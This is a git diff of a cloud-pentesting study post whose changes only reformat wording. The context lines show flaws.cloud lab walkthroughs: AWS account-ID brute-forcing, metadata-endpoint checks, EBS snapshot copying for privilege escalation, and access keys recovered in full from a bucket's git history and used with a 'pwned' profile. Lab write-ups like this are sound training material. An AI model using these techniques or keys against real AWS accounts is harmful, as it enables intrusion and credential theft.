@@ -12,11 +12,11 @@ header:
 
 # Pentesting cloud environments
 
-It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, as well as any notes I take on theoretical material. I skipped some labs that required a bit more setting up such as <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a> and <a href="https://github.com/ine-labs/AWSGoat">AWSGoat</a>, I cannot vouch for them but they seem like good training too. Hopefully it overlaps with the other resources and I don't miss out on much.
+It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, along with any notes I take on theoretical material. I skipped some labs that required a bit more setup such as <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a> and <a href="https://github.com/ine-labs/AWSGoat">AWSGoat</a>. I cannot vouch for them but they seem like good training too. Hopefully they overlap with the other resources and I don't miss out on much.
 
-This is more or less the usual process I take whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.
+This is more or less the usual process I follow whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.
 
-For a slightly more readable version, check this post out <a href="https://github.com/BrunoCaseiro/brunocaseiro.github.io/blob/master/_posts/2025-10-04-Testing-pens-in-heaven.md">here</a>
+For a slightly more readable version, read this post <a href="https://github.com/BrunoCaseiro/brunocaseiro.github.io/blob/master/_posts/2025-10-04-Testing-pens-in-heaven.md">here</a>
 
 
 ## The plan
@@ -82,9 +82,9 @@ For a slightly more readable version, check this post out <a href="https://githu
   <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
 </p>
 
-* Use **`aws configure`** to use these credentials, which will save them to `~/.aws/credentials`
-* For the session token, use **`aws configure set aws_session_token <token>`**
-* Check current identity and privileges, respectively, with **`aws sts get-caller-identity`** and **`aws iam list-attached-user-policies --user-name support`**
+* Use `aws configure` to use these credentials, which will save them to `~/.aws/credentials`
+* For the session token, use `aws configure set aws_session_token <token>`
+* Check current identity and privileges, respectively, with `aws sts get-caller-identity` and `aws iam list-attached-user-policies --user-name support`
 
 <br>
 
@@ -115,14 +115,14 @@ Also **enumerate** and **fingerprint** the cloud infrastructure for used compone
 
 A few **AWS-specific reconnaissance techniques**:
 * Searching the AWS Marketplace for the target organization as teh accountid may be disclosed
-* Brute-forcing the account ID via the AWS Sign-In URL: **`https://<accountid>.signin.aws.amazon.com`**
+* Brute-forcing the account ID via the AWS Sign-In URL: `https://<accountid>.signin.aws.amazon.com`
 * Searching through public snapshots (i.e EBS snapshots) or AMI Images
 
 <br>
 
 Regarding the **local filesystem**, other tasks besides the typical, non-cloud checks, are:
 * Discovery of AWS Access Credentials in home directories and application files
-* Verifying access to the **AWS metadata enpoint** at **`https://169.254.169.254/`** or **`http://[fd00:ec2::254]`**
+* Verifying access to the **AWS metadata enpoint** at `https://169.254.169.254/` or `http://[fd00:ec2::254]`
 
 <br>
 
@@ -252,7 +252,7 @@ Time to **escalate privileges**. An attack path with these privileges is to firs
     ]
 }
 ```
-Note the **`VolumeID`** to create a snapshot of it later
+Note the `VolumeID` to create a snapshot of it later
 ```
 [www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
 {
@@ -269,7 +269,7 @@ Note the **`VolumeID`** to create a snapshot of it later
 }
 ```
 
-When creating a new instance in the same region, the snapshot can be found by searching by the **`OwnerID`**
+When creating a new instance in the same region, the snapshot can be found by searching by the `OwnerID`
 
 <p align="center">
   <img src="https://github.com/user-attachments/assets/ac941322-2ecb-4fe4-a21f-5597ad412f59" width="40%">
@@ -407,9 +407,9 @@ Address: 52.92.164.11
 11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
 ```
 
-But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the **`aws configure`** command. This should be more or less straight forward
+But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the `aws configure` command. This should be more or less straight forward
 
-I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with **`sudo timedatectl set-ntp true`**
+I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with `sudo timedatectl set-ntp true`
 
 Anyway, after setting up the credentials, the same command will work since it automatically assumes the AWS profile
 
@@ -479,7 +479,7 @@ And listing the files works again. Note how this is a git directory
 2017-02-26 19:14:33         26 robots.txt
 
 ```
-After downloading the entire bucket and running the command **`git log`** to see commit history, it seems like Scott committed something interesting by accident
+After downloading the entire bucket and running the command `git log` to see commit history, it seems like Scott committed something interesting by accident
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .             
@@ -507,7 +507,7 @@ Date:   Sun Sep 17 09:10:07 2017 -0600
 
     first commit
 ```
-To see what was committed by accident, use **`git checkout`** followed by the hash token. We got access keys!
+To see what was committed by accident, use `git checkout` followed by the hash token. We got access keys!
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
@@ -536,7 +536,7 @@ access_key AKIAJ366LIPB4IJKT7SA
 secret_access_key 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
 ```
 
-Use **`aws configure`** to configure a new profile with the stolen keys, followed by a call to the S3 service to list buckets we now have access to
+Use `aws configure` to configure a new profile with the stolen keys, followed by a call to the S3 service to list buckets we now have access to
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ aws s3 ls --profile pwned                                              
@@ -578,7 +578,7 @@ ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
     "Arn": "arn:aws:iam::975426262029:user/backup"
 }
 ```
-With the region and the user ID, it's now possible to call **`ec2 describe-snapshost`**. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
+With the region and the user ID, it's now possible to call `ec2 describe-snapshost`. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
 ```
 ┌──(kali㉿kali)-[~/Desktop/bucket]
 └─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
